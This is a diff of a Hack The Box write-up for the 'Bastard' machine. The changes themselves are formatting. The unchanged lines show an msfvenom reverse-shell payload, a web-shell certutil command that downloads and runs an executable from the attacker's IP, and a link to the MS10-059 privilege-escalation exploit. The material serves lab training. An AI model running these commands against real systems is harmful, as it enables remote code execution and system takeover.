@@ -3,7 +3,6 @@ title: "HTB Bastard"
 permalink: /writeups/bastard
 location: default
 ---
-
 # HTB Bastard
 
 **Machine Information**
@@ -53,7 +52,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 The `nmap` output shows that the web server is running `Drupal 7` which can be confirmed using the `CHANGELOG.txt` file.
 
-> http://10.10.10.9/CHANGELOG.txt
+<http://10.10.10.9/CHANGELOG.txt>
 
 Use `searchsploit` to look for exploits for `Drupal 7`.
 
@@ -75,7 +74,7 @@ dirsearch -u http://10.10.10.9
 
 This can be confirmed by visiting the page in a browser.
 
-> http://10.10.10.9/rest
+<http://10.10.10.9/rest>
 
 ```
 Services Endpoint "rest_endpoint" has been setup successfully.
@@ -117,11 +116,13 @@ To get a full shell we will create a payload using `msfvenom`.
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f exe > shelly.exe
 ```
 
-Use our web shell to upload this to our target machine. Start a new `netcat` listener and run the executable.
+Use our web shell to upload this to our target machine.
 
 ```
 http://10.10.10.9/shell.php?fexec=certutil -urlcache -f http://10.10.14.4/shelly.exe shelly.exe
 ```
+
+Start a new `netcat` listener and run the executable.
 
 ```
 http://10.10.10.9/shell.php?fexec=shelly.exe
@@ -150,7 +151,7 @@ Hotfix(s):                 N/A
 
 Upload the `Chimichurri.exe` exploit to the target machine. It can be obtained from the following link:
 
-> https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe
+<https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe>
 
 Transfer it to the target machine and start a new `netcat` listener. Once listening run the exploit to get an elevated shell.
 
